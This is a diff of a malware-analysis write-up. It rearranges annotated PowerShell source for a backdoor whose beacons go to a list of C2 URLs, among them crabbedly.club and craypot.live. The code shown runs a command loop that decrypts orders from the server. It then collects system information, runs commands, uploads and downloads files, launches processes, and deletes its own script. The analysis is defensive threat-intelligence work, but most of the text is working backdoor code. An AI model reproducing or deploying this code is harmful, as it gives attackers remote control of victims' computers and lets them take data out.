@@ -130,6 +130,63 @@ $global:url="https://crabbedly.club/board.php","https://craypot.live/board.php",
 $global:nup=0
 $global:nwct=0
 ``` 
+###### The backdoor execute a while loop until that the order to destroy the session push to the value of the variable "breakvalue" at 0.
+``` powershell
+function main()
+{
+	$global:tid=Get-Random -Minimum 128 -Maximum 16383
+	while($global:breakvalue)
+	{
+		Try
+		{
+			if($global:nwct -gt 0){$global:nwct=$global:nwct- 1}
+			if($global:nwct -le 0){ if (PulsetoC2(16) -eq $true){Start-Sleep -s 4; command($global:url[$global:nup])} }
+		}
+		Catch{}
+		if($global:breakvalue -ne 1){break}
+		Start-Sleep -s 60
+	}
+}
+try{Remove-Item -Path $MyInvocation.MyCommand.Source}catch{}
+main
+``` 
+###### In function of the result of the id push by the C2, this execute the following actions in the infected computer.
+``` powershell
+function command($url)
+{
+	try
+	{
+		while($global:breakvalue)
+		{
+			$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
+			if($rq -eq $null){break}
+			$basefunctions=DecryptC2Data $rq $global:mbz
+			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
+			$nmsg=ConverttoInt32 $basefunctions 0
+			$nmlen=ConverttoInt32 $basefunctions 8
+			if($basefunctions.length -ne ($nmlen+12)){break}
+			$cres=0
+			if($nmsg -eq 2){$cres=slp $basefunctions}
+			elseif($nmsg -eq 3){$cres=diconnect}
+			elseif($nmsg -eq 11){$cres=Set-SysInfo}
+			elseif($nmsg -eq 12){$cres=kalv}
+			elseif($nmsg -eq 14){$cres=Get-actions}
+			elseif($nmsg -eq 15){$cres=Set-actions $basefunctions}
+			elseif($nmsg -eq 18){$cres=Set-command $basefunctions}
+			elseif($nmsg -eq 20){$cres=upload $basefunctions}
+			elseif($nmsg -eq 21){$cres=download $basefunctions}
+			elseif($nmsg -eq 24){$cres=launch_process $basefunctions}
+			else{break}
+			if($cres -eq 0){break}
+			Start-Sleep -s 1
+		}
+		Start-Sleep -s 4
+		if(PulsetoC2(17) -eq $true){}
+	}
+	catch{}
+}
+
+``` 
 ###### The next bloc content the functions for copy the bytes and convert from different encoding the data.
 ``` powershell
 function CopyBytes($DatatoCopy,$dst,$dstOffset)
@@ -292,7 +349,7 @@ function updatemod3($nmsg)
 	return $trigger
 }
 ```
-###### This have the possiblity to set in standby the backdoor and to close the session.
+###### This have the possiblity to set in standby the backdoor, close the current session and get the system informations.
 ``` powershell
 function slp($buf)
 {
@@ -319,9 +376,6 @@ function disconnect()
 	} while($false)
 	return $trigger
 }
-```
-
-``` powershell
 function Set-SysInfo()
 {
 	$trigger=0
@@ -356,17 +410,10 @@ function Set-SysInfo()
 	} while($false)
 	return $trigger
 }
-function kalv()
-{
-	$trigger=0
-	do
-	{
-		$trigger=updatemod1
-		if($trigger -eq 0){break}
-		$trigger=1
-	} while($false)
-	return $trigger
-}
+```
+###### This can get the actions and push the actions to do on the system.
+``` powershell
+
 function Get-actions()
 {
 	$trigger=0
@@ -411,6 +458,9 @@ function Set-actions($buf)
 	} while($false)
 	return $trigger
 }
+```
+###### The attacker can perform a specific action in another CLI.
+``` powershell
 function Set-command($buf)
 {
 	$trigger=0
@@ -482,6 +532,9 @@ function Set-command($buf)
 	}while($false)
 	return $trigger
 }
+```
+###### Finally, this can download and upload files on the C2, send a pulse to the C2, push a trigger and launch a new process ( like push an additionnal tool).
+``` powershell
 function upload($buf)
 {
 	$trigger=0
@@ -609,6 +662,17 @@ function download($buf)
 	} while($false)
 	return $trigger
 }
+function kalv()
+{
+	$trigger=0
+	do
+	{
+		$trigger=updatemod1
+		if($trigger -eq 0){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
 function launch_process($buf)
 {
 	$trigger=0
@@ -635,58 +699,11 @@ function PulsetoC2($rid)
 	}
 	return $trigger
 }
-function command($url)
-{
-	try
-	{
-		while($global:breakvalue)
-		{
-			$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
-			if($rq -eq $null){break}
-			$basefunctions=DecryptC2Data $rq $global:mbz
-			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
-			$nmsg=ConverttoInt32 $basefunctions 0
-			$nmlen=ConverttoInt32 $basefunctions 8
-			if($basefunctions.length -ne ($nmlen+12)){break}
-			$cres=0
-			if($nmsg -eq 2){$cres=slp $basefunctions}
-			elseif($nmsg -eq 3){$cres=diconnect}
-			elseif($nmsg -eq 11){$cres=Set-SysInfo}
-			elseif($nmsg -eq 12){$cres=kalv}
-			elseif($nmsg -eq 14){$cres=Get-actions}
-			elseif($nmsg -eq 15){$cres=Set-contentaction $basefunctions}
-			elseif($nmsg -eq 18){$cres=Set-command $basefunctions}
-			elseif($nmsg -eq 20){$cres=upload $basefunctions}
-			elseif($nmsg -eq 21){$cres=download $basefunctions}
-			elseif($nmsg -eq 24){$cres=launch_process $basefunctions}
-			else{break}
-			if($cres -eq 0){break}
-			Start-Sleep -s 1
-		}
-		Start-Sleep -s 4
-		if(PulsetoC2(17) -eq $true){}
-	}
-	catch{}
-}
-function main()
-{
-	$global:tid=Get-Random -Minimum 128 -Maximum 16383
-	while($global:breakvalue)
-	{
-		Try
-		{
-			if($global:nwct -gt 0){$global:nwct=$global:nwct- 1}
-			if($global:nwct -le 0){ if (PulsetoC2(16) -eq $true){Start-Sleep -s 4; command($global:url[$global:nup])} }
-		}
-		Catch{}
-		if($global:breakvalue -ne 1){break}
-		Start-Sleep -s 60
-	}
-}
-try{Remove-Item -Path $MyInvocation.MyCommand.Source}catch{}
-main
-
 ```
+
+
+
+
 
 ## Cyber kill chain <a name="Cyber-kill-chain"></a>
 ###### The process graphs resume all the cyber kill chains used by the attacker. 
